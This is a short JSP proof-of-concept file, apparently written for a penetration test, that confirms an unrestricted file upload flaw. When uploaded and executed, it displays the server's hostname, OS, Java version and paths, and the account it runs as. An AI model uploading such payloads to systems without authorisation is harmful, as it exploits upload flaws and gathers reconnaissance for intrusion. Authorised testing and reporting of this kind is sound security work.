<%@ page import="java.net.InetAddress" %>
<%
    String hostname = InetAddress.getLocalHost().getHostName();
    String javaVersion = System.getProperty("java.version");
    String osName = System.getProperty("os.name");
    String osVersion = System.getProperty("os.version");
    String user = System.getProperty("user.name");
    String javaHome = System.getProperty("java.home");
    String workingDir = System.getProperty("user.dir");
%>
<!DOCTYPE html>
<html>
<body>
    <h2>== PENETRATION TEST - UNRESTRICTED FILE UPLOAD POC ==</h2>
    <p><b>This JSP file was successfully uploaded and executed by the server.</b></p>
    <hr/>
    <table>
        <tr><td><b>Hostname:</b></td><td><%= hostname %></td></tr>
        <tr><td><b>OS:</b></td><td><%= osName %> <%= osVersion %></td></tr>
        <tr><td><b>Java Version:</b></td><td><%= javaVersion %></td></tr>
        <tr><td><b>Java Home:</b></td><td><%= javaHome %></td></tr>
        <tr><td><b>Running As User:</b></td><td><%= user %></td></tr>
        <tr><td><b>Working Directory:</b></td><td><%= workingDir %></td></tr>
    </table>
    <hr/>
    </body>
</html>
